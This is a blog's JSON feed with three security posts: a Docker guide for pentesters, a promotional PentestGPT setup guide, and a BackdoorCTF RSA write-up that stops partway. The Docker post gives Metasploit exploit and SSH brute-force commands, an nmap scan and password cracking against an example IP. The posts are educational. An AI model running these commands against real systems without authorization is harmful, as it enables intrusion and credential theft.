{
    "version": "https://jsonfeed.org/version/1",
    "title": "Offens!ve Blogs - Sakibul Ali Khan",
    "description": "",
    "home_page_url": "https://sakibulalikhan.pages.dev",
    "feed_url": "https://sakibulalikhan.pages.dev/feed.json",
    "user_comment": "",
    "icon": "https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png",
    "author": {
        "name": "Sakibul Ali Khan"
    },
    "items": [
        {
            "id": "https://sakibulalikhan.pages.dev/docker-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "url": "https://sakibulalikhan.pages.dev/docker-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "title": "Docker Zero to Hero For Hackers: A Practical Guide for Cybersecurity Enthusiasts",
            "summary": "Docker is an open-source platform designed to empower developers by facilitating the building, shipping, and running of applications within containers. As a lightweight and portable&hellip;",
            "content_html": "<div class=\"layout__panel layout__panel--navigation-bar\"><nav class=\"navigation-bar navigation-bar--editor\">\n<div class=\"navigation-bar__inner navigation-bar__inner--edit-pagedownButtons\">\n<div> </div>\n</div>\n</nav></div>\n<div class=\"layout__panel flex flex--row\">\n<div class=\"layout__panel layout__panel--preview\">\n<div class=\"preview\">\n<div class=\"preview__inner-1\">\n<div class=\"preview__inner-2\">\n<div class=\"cl-preview-section\">\n<p id=\"introduction\"><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">Docker is an open-source platform designed to empower developers by facilitating the building, shipping, and running of applications within containers. As a lightweight and portable containerization technology, Docker wraps an application and its dependencies into a container, allowing easy deployment across diverse host systems. In this blog post, we’ll delve into the fundamental concepts of Docker, breaking down the intricacies for cybersecurity enthusiasts. We’ll cover container basics, Docker architecture, and provide practical examples of how Docker can be a game-changer in the realm of cybersecurity.</span></p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"what-is-a-container\">What is a container?</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p><img loading=\"lazy\" src=\"https://apachebooster.com/kb/wp-content/uploads/2017/09/docker-container.png\" alt=\"docker-container » Open Up The Cloud\" width=\"411\" height=\"327\" data-is-external-image=\"true\"></p>\n<p>A container is a standardized unit of software bundling code and its dependencies. It ensures swift and reliable application execution across different computing environments. In cybersecurity terms, a container serves as a secure vault encapsulating an application, its libraries, and essential system dependencies. The lightweight and portable nature of containers makes them ideal for cybersecurity tasks, enabling seamless deployment in various environments.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"containers-vs-virtual-machines\">Containers vs Virtual Machines</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p><img loading=\"lazy\" src=\"https://th.bing.com/th/id/OIP.0Kuv9Rt9fQSFg5Nw9U2p3wAAAA?rs=1&amp;pid=ImgDetMain\" alt=\"Docker Containers vs. VMs: Pros and Cons of Containers and Virtual Machines\" data-is-external-image=\"true\"></p>\n<p>Containers and virtual machines (VMs) both isolate applications and their dependencies, yet they differ significantly:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>\n<p><strong>Resource Utilization</strong>: Containers share the host OS kernel, making them lighter and faster compared to VMs, which require a full-fledged OS.</p>\n</li>\n<li>\n<p><strong>Portability</strong>: Containers excel in portability, capable of running on any system with a compatible host OS. VMs, however, rely on specific hypervisors for compatibility.</p>\n</li>\n<li>\n<p><strong>Security</strong>: VMs offer heightened security with isolated operating systems. Containers, sharing the host OS, provide less isolation but are more manageable.</p>\n</li>\n<li>\n<p><strong>Management</strong>: Container management is generally easier due to their lightweight and agile nature.</p>\n</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"why-are-containers-lightweight\">Why are containers lightweight?</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Containers achieve their lightweight nature through containerization, a technology enabling them to share the host OS kernel and libraries while maintaining application isolation. This results in a compact footprint compared to traditional virtual machines, as containers exclude a full OS, further minimizing their size.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-architecture\">Docker Architecture</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/16/docker-architecture-diagram.png\" alt=\"Docker Architecture for Hackers/Pentester\" width=\"440\" height=\"347\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-architecture-diagram-lg.png 1024w\"></figure>\n<p>Docker follows a client-server architecture comprising:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>\n<p><strong>Docker Client</strong>: A command-line interface (CLI) tool sending commands to the Docker daemon.</p>\n</li>\n<li>\n<p><strong>Docker Daemon</strong>: The server component managing Docker objects such as images, containers, networks, and volumes.</p>\n</li>\n<li>\n<p><strong>Docker Registry</strong>: A central repository storing Docker images.</p>\n</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<p><a href=\"https://docs.docker.com/engine/docker-overview/architecture/\"></a><span style=\"color: var(--headings-color); font-family: var(--font-base); font-size: 1.60181em; font-weight: var(--font-weight-bold); letter-spacing: var(--letter-spacing);\">How to use Docker?</span></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Docker lifecycle involves creating a Dockerfile, building a Docker image, running a Docker container, and pushing the Docker image to a registry. Here’s a brief overview:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li><strong>Create a Dockerfile</strong>: A text file with instructions for building a Docker image.</li>\n<li><strong>Build the Docker image</strong>: Use the Dockerfile to create a read-only template.</li>\n<li><strong>Run the Docker container</strong>: Create a running instance of the image.</li>\n<li><strong>Push the Docker image</strong>: Share the built image on a Docker registry for collaboration.</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-lifecycle\">Docker LifeCycle</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/16/docker-container-lifecycle-diagram.png\" alt=\"Docker Container Lifecycle Diagram\" width=\"609\" height=\"343\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/16/responsive/docker-container-lifecycle-diagram-lg.png 1024w\"></figure>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li><code>docker build</code>: Builds Docker images from a Dockerfile.</li>\n<li><code>docker run</code>: Runs a container from Docker images.</li>\n<li><code>docker push</code>: Pushes the container image to public/private registries for sharing.</li>\n</ul>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"understanding-the-terminology\">Understanding the Terminology</h2>\n</div>\n<div class=\"cl-preview-section\">\n<h3><figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://th.bing.com/th/id/R.8075d1933dff4f771cbd666c66347d9a?rik=Nr7Yj30lB3TBUw&amp;pid=ImgRaw&amp;r=0\" alt=\"\" width=\"419\" height=\"325\" data-is-external-image=\"true\"></figure></h3>\n<h3 id=\"docker-daemon\">Docker Daemon</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Docker daemon listens for Docker API requests, managing Docker objects like images, containers, networks, and volumes. Daemons can communicate with each other to handle Docker services.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"docker-client\">Docker Client</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>The Docker client is the primary way users interact with Docker. Commands such as <code>docker run</code> are sent to the client, which executes them. The Docker client can communicate with multiple daemons.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"docker-desktop\">Docker Desktop</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker Desktop is an easy-to-install application for Mac, Windows, or Linux environments. It includes the Docker daemon, Docker client, Docker Compose, Docker Content Trust, Kubernetes, and Credential Helper.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"docker-registries\">Docker Registries</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker registries store Docker images. Docker Hub is a public registry, and Docker is configured to look for images there by default. Users can also run private registries.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"install-docker\">INSTALL DOCKER</h2>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://www.clipartmax.com/png/middle/146-1469802_logo-logo-docker.png\" alt=\"\" width=\"520\" height=\"243\" data-is-external-image=\"true\"></figure>\n<p>For detailed instructions on installing Docker, visit <a href=\"https://docs.docker.com/get-docker/\" target=\"_blank\" rel=\"noopener noreferrer\">Docker Installation Guide</a>.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>For a quick demo, create an Ubuntu EC2 instance on AWS and execute the following commands:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo apt update\nsudo apt install docker.io -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"start-docker-and-grant-access\">Start Docker and Grant Access</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>After installing Docker, ensure the Docker daemon is running. Verify with:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo systemctl status docker\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>If not running, start the daemon:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo systemctl start docker\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Grant access to your user:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo usermod -aG docker ubuntu\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Log out and log back in for changes to take effect.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Verify Docker installation:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>docker run hello-world\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-is-installed-up-and-running\">Docker is Installed, up and running</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Use the same command to confirm:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>docker run hello-world\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"docker-images-for-cybersecuritypentesting\">Docker Images for Cybersecurity/Pentesting</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker provides a rich ecosystem of pre-built images tailored for cybersecurity and penetration testing, offering versatility and efficiency in setting up security environments. Here are additional examples of Docker images that cater to specific cybersecurity needs:</p>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li>\n<p><strong>Kali Linux</strong></p>\n<p>Kali Linux is a widely-used Linux distribution for penetration testing, forensics, and security auditing. The Kali Linux Docker image is a versatile tool for cybersecurity practitioners. It includes a plethora of tools such as Wireshark, Nmap, Burp Suite, and John the Ripper.</p>\n<pre class=\"language-bash line-numbers\"><code>docker pull kalilinux/kali-linux-docker\n</code></pre>\n<p>Example Usage:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it kalilinux/kali-linux-docker /bin/bash\n</code></pre>\n<ul>\n<li>\n<p><strong>Additional Example 1:</strong> Launching Wireshark for network analysis within the Kali Linux container:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-linux-docker wireshark\n</code></pre>\n<p>In this scenario, the container gains access to the host network stack, enabling network analysis with Wireshark directly from the container.</p>\n</li>\n<li>\n<p><strong>Additional Example 2:</strong> Performing a quick Nmap scan on a target:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it --rm kalilinux/kali-linux-docker nmap -p 1-1000 192.168.1.1\n</code></pre>\n<p>This command runs an Nmap scan against the specified IP address, showcasing the utility of Kali Linux tools within the Docker container.</p>\n</li>\n<li>\n<p><strong>Additional Example 3:</strong> Using John the Ripper to crack passwords:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run -it --rm kalilinux/kali-linux-docker john --wordlist=/usr/share/wordlists/rockyou.txt /path/to/password/file\n</code></pre>\n<p>Here, the container employs John the Ripper to attempt password cracking using a common wordlist.</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Metasploit Framework</strong></p>\n<p>Metasploit Framework is a powerful open-source tool for penetration testing, vulnerability research, and development. The Metasploit Framework Docker image simplifies the setup of Metasploit within a controlled environment.</p>\n<pre class=\"language-bash line-numbers\"><code>docker pull metasploitframework/metasploit-framework\n</code></pre>\n<p>Example Usage:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework\n</code></pre>\n<ul>\n<li>\n<p><strong>Additional Example 1:</strong> Running an auxiliary module for HTTP enumeration:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework msfconsole -x \"use auxiliary/scanner/http/http_enum; set RHOSTS 192.168.1.1; run\"\n</code></pre>\n<p>This command launches Metasploit and executes an HTTP enumeration scan against the specified target.</p>\n</li>\n<li>\n<p><strong>Additional Example 2:</strong> Exploiting a known vulnerability using Metasploit:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework msfconsole -x \"use exploit/windows/smb/ms08_067_netapi; set RHOSTS 192.168.1.1; run\"\n</code></pre>\n<p>Here, Metasploit is utilized to exploit a specific Windows SMB vulnerability on the given IP address.</p>\n</li>\n<li>\n<p><strong>Additional Example 3:</strong> Brute-forcing SSH credentials using Metasploit:</p>\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -it metasploitframework/metasploit-framework msfconsole -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.1; set USER_FILE /path/to/usernames.txt; set PASS_FILE /path/to/passwords.txt; run\"\n</code></pre>\n<p>This command demonstrates using Metasploit for SSH credential brute-forcing.</p>\n</li>\n</ul>\n</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"conclusion\">Conclusion</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Docker has revolutionized software development and deployment. Its ability to package applications and dependencies into portable containers streamlines deployment across different environments. Docker’s versatility and user-friendly approach make it an ideal solution for modern software development practices, including continuous integration and delivery. Embrace Docker, and let your journey from zero to hero in the cybersecurity landscape begin!</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/16/Docker-Zero-to-Hero-For-Hackers-A-Practical-Guide-for-Cybersecurity-Enthusiasts.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Pentesting",
                   "DevSecOps",
                   "Cyber Security",
                   "Cloud Security"
            ],
            "date_published": "2024-02-01T05:05:20+06:00",
            "date_modified": "2024-02-01T05:05:20+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/unveiling-pentestgpt-the-ultimate-weapon-for-hacker-and-penetration-tester-2.html",
            "url": "https://sakibulalikhan.pages.dev/unveiling-pentestgpt-the-ultimate-weapon-for-hacker-and-penetration-tester-2.html",
            "title": "Unveiling PentestGPT: The Ultimate Weapon For Hacker And Penetration Tester",
            "summary": "In the continuously evolving landscape of cybersecurity, staying ahead of potential threats is of utmost importance. Say hello to PentestGPT, the groundbreaking penetration testing tool&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">In the continuously evolving landscape of cybersecurity, staying ahead of potential threats is of utmost importance. Say hello to PentestGPT, the groundbreaking penetration testing tool that harnesses the power of ChatGPT to streamline and automate the penetration testing process. Developed by GreyDGL, a Ph.D. student at Nanyang Technological University, this tool introduces a novel approach to penetration testing, combining cutting-edge technology with a user-friendly interface.</span></p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Empowering Pentesters: Enhanced Efficiency and Effectiveness</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>Penetration testing, also known as ethical hacking, is a vital practice for identifying system vulnerabilities before malicious actors exploit them. PentestGPT acts as an invaluable companion for penetration testers, automating multiple testing aspects while maintaining an interactive mode. Designed to empower cybersecurity experts, this tool significantly enhances their overall progress and specific operations, optimizing the penetration testing process.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>The Power of ChatGPT: Empowering PentestGPT’s Performance</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>At the heart of PentestGPT lies the ChatGPT API, particularly the GPT-4 module renowned for its exceptional performance in penetration testing reasoning. By integrating ChatGPT, PentestGPT leverages human-like conversations, offering informative guidance to penetration testers throughout complex procedures. For optimal performance, ChatGPT Plus or the GPT-4 API is recommended.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Simplified User Interface: Seamlessly Navigate PentestGPT</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>PentestGPT boasts a user-friendly design that simplifies the penetration testing workflow. The tool comprises three main modules: test generation, test reasoning, and parsing. Featuring a unified terminal input handler, it serves as the primary access point, enabling users—both cybersecurity professionals and non-technical individuals—to initiate sessions, start new testing sessions, and request to-do lists. PentestGPT ensures seamless interaction, accommodating users of varying technical expertise.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Unveiling the Inner Workings of PentestGPT</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>PentestGPT operates through a logical flow that entails user initialization, task-tree generation, to-do list determination, and continuous user interaction. The tool facilitates the execution of penetration testing commands, parsing tool outputs, and dynamically updating the task-tree based on gathered information. PentestGPT’s interactive nature allows users to engage in discussions, receive guidance, and stay informed throughout the testing process.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Installation Guide: Step-by-Step Setup</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li><strong>Clone the Repository:</strong>\n<ul>\n<li>\n<p>Begin by cloning the PentestGPT repository from GitHub.</p>\n<pre><code>git clone https://github.com/GreyDGL/PentestGPT.git\ncd PentestGPT\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Install Dependencies:</strong>\n<ul>\n<li>\n<p>Install the necessary dependencies using pip.</p>\n<pre><code>pip install -r requirements.txt\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Configure ChatGPT Session:</strong>\n<ul>\n<li>\n<p>Copy the sample configuration file and configure the ChatGPT session with cookies.</p>\n<pre><code>cp config/chatgpt_config_sample.py config/chatgpt_config.py\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Obtain ChatGPT Session Cookie:</strong>\n<ul>\n<li>Log in to the ChatGPT session page and open the Inspect tool.</li>\n<li>Navigate to the Network tab and locate connections to the ChatGPT session page.</li>\n<li>Find the cookie in the request header of the URL \"<a href=\"https://chat.openai.com/api/auth/session.%22\">https://chat.openai.com/api/auth/session.\"</a></li>\n<li>Copy the cookie value and paste it into the “cookie” field in the “config/chatgpt_config.py” file.</li>\n</ul>\n</li>\n<li><strong>Test Connection: Verify Configuration</strong>\n<ul>\n<li>\n<p>Confirm the connection is properly configured.</p>\n<pre><code>python3 test_connection.py\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Start PentestGPT:</strong>\n<ul>\n<li>\n<p>Utilize the reasoning model recommended based on your access.</p>\n<pre><code>pentestgpt --reasoning_model=gpt-4-turbo\n</code></pre>\n<ul>\n<li>(recommended) - <code>pentestgpt --reasoning_model=gpt-4-turbo</code> to use the latest GPT-4-turbo API.</li>\n<li><code>pentestgpt --reasoning_model=gpt-4</code> if you have access to GPT-4 API.</li>\n<li><code>pentestgpt --reasoning_model=gpt-3.5-turbo-16k</code> if you only have access to GPT-3.5 API.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Installation Video:</strong><br><div class=\"post__iframe\"><iframe loading=\"lazy\" width=\"560\" height=\"315\" src=\"https://www.youtube-nocookie.com/embed/tGC5z14dE24?si=Bot2TYzI5jLFt3-q\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen=\"allowfullscreen\"></iframe></div>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>Examples of Usage: Unleash PentestGPT’s Potential</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<ol>\n<li><strong>Initializing a New Penetration Testing Session:</strong>\n<ul>\n<li>\n<p>Initiate a new session using the handler, providing target information.</p>\n<pre><code>pentestgpt --args\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Executing Tasks:</strong>\n<ul>\n<li>\n<p>Follow the guidance to perform various penetration testing tasks. For instance:</p>\n<pre><code>pentestgpt --reasoning_model=gpt-4-turbo\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Discussing Findings:</strong>\n<ul>\n<li>\n<p>Engage PentestGPT in insightful discussions about specific findings.</p>\n<pre><code>pentestgpt --discuss\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Obtaining a To-Do List:</strong>\n<ul>\n<li>\n<p>Request a comprehensive to-do list from PentestGPT for the next steps.</p>\n<pre><code>pentestgpt --todo\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Exiting the Program:</strong>\n<ul>\n<li>\n<p>Safely exit the program once the testing is complete.</p>\n<pre><code>pentestgpt --quit\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>Demo Video:</strong><br><div class=\"post__iframe\"><iframe loading=\"lazy\" width=\"560\" height=\"315\" src=\"https://www.youtube-nocookie.com/embed/Vs9DFtAkODM?si=EepYs3OjmWVTUFOF\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen=\"allowfullscreen\"></iframe></div>\n</div>\n<div class=\"cl-preview-section\">\n<h2><strong>In Conclusion: Welcome to the Era of PentestGPT</strong></h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>PentestGPT emerges as a groundbreaking tool in the realm of automated penetration testing, revolutionizing the fusion of advanced technology and user-friendly design. Whether you are an experienced cybersecurity professional or possess a non-technical background, PentestGPT bridges the gap, facilitating efficient and effective security testing. Its ability to automate tasks, engage in interactive conversations, and guide users throughout the penetration testing process cements its status as a valuable asset in the cybersecurity arsenal.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>In a world where cybersecurity threats constantly evolve, PentestGPT shines as an innovative beacon, making security testing more accessible, efficient, and impactful than ever before. Embrace the power of PentestGPT and unlock unparalleled security expertise.</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/15/Unveiling-PentestGPT_-The-Ultimate-Weapon-For-Hacker-And-Penetration-Tester-2.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Pentesting",
                   "Hacking Tools",
                   "Artificial Intelligence"
            ],
            "date_published": "2024-01-30T00:27:41+06:00",
            "date_modified": "2024-01-30T01:13:15+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/backdoorctf-2023-mini_rsa-challenge-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/backdoorctf-2023-mini_rsa-challenge-writeup.html",
            "title": "BackdoorCTF 2023 — mini_RSA Challenge Writeup",
            "summary": "reetings, fellow cybersecurity enthusiasts and CTF players! In this writeup, we will dive into the solution of the “mini_RSA” challenge from the BackdoorCTF 2023. Groot&hellip;",
            "content_html": "<p id=\"fd65\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj ot\" data-selectable-paragraph=\"\">reetings, fellow cybersecurity enthusiasts and CTF players! In this writeup, we will dive into the solution of the “mini_RSA” challenge from the BackdoorCTF 2023.</p>\n<figure class=\"pd pe pf pg ph mp mh mi paragraph-image\">\n<div class=\"pi pj fg pk bg pl\" tabindex=\"0\" role=\"button\">\n<div class=\"mh mi amo\"><figure class=\"bg lo mq c\"><source srcset=\"https://miro.medium.com/v2/resize:fit:640/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1400w\" sizes=\"(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px\" type=\"image/webp\"><source data-testid=\"og\" srcset=\"https://miro.medium.com/v2/resize:fit:640/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*mN-RcjmqlEvyxQruV5Q1ZQ.png 1400w\" sizes=\"(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*mN-RcjmqlEvyxQruV5Q1ZQ.png\" alt=\"BackdoorCTF 2023 — mini_RSA Challenge Writeup by sakibulalikhan\" width=\"700\" height=\"264\" loading=\"eager\" data-is-external-image=\"true\"></figure></picture></div>\n</div>\n</figure>\n<h1 id=\"9504\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">Challenge Overview</h1>\n<p id=\"3af4\" class=\"pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj\" data-selectable-paragraph=\"\">Groot has encrypted a message using RSA with a key size of 512 bits and a public exponent (RSA_E) of 3. The challenge provides two files: <code class=\"cw amp amq amr po b\">script.py</code> and <code class=\"cw amp amq amr po b\">output.txt</code>. The former contains the RSA encryption script used by Groot, while the latter presents the output ciphertext (c) and the modulus (n).</p>\n<p id=\"b79b\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">Let’s explore the provided files and understand the challenge before revealing the solution.</p>\n<h1 id=\"ef6e\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">The Encryption Script: script.py</h1>\n<pre class=\"pd pe pf pg ph pn po pp bo pq ba bj\"><span id=\"cc79\" class=\"pr nq gr po b bf ps pt l pu pv\" data-selectable-paragraph=\"\"><span class=\"hljs-comment\"># Import necessary modules</span><br><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> getPrime, bytes_to_long, GCD<br><span class=\"hljs-keyword\">import</span> random<br><span class=\"hljs-keyword\">import</span> time<br><br><span class=\"hljs-comment\"># Set the seed for randomness</span><br>random.seed(time.time())<br><br><span class=\"hljs-comment\"># Define the flag to be encrypted (flag{REDACTED})</span><br>flag = <span class=\"hljs-string\">b\"flag{REDACTED}\"</span><br><br><span class=\"hljs-comment\"># Define RSA parameters</span><br>KEY_SIZE = <span class=\"hljs-number\">512</span><br>RSA_E = <span class=\"hljs-number\">3</span><br><br><span class=\"hljs-comment\"># Function for fast modular 